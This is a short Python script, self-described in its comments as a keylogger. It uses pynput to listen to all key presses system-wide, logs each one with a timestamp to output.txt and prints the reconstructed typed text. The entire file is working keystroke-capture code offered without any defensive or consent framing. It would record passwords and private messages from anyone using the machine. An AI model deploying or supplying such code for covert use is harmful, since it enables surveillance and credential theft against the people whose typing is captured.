from pynput import keyboard
import time

# Global variable to store typed text
typed_text = ""

def on_key_press(key):
    """
    Function to handle key presses and write them to a log file
    """
    global typed_text
    log_file = open("output.txt", "a")
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    
    if hasattr(key, 'char'):  # Normal key press
        typed_text += key.char
        log_file.write(f"{timestamp} - {key.char}\n")
    elif key == keyboard.Key.space: # Space key
        typed_text += " "
        log_file.write(f"{timestamp} - [Space]\n")
    elif key == keyboard.Key.enter: # Enter key
        typed_text += "\n"
        log_file.write(f"{timestamp} - [Enter]\n")
    elif key == keyboard.Key.backspace: # Backspace key
        typed_text = typed_text[:-1]
        log_file.write(f"{timestamp} - [Backspace]\n")
    else: # Other keys
        log_file.write(f"{timestamp} - [{key}]\n")
        
    log_file.close()
    print(typed_text)
    
if __name__ == "__main__":
    # Start the keylogger and listen for key presses
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()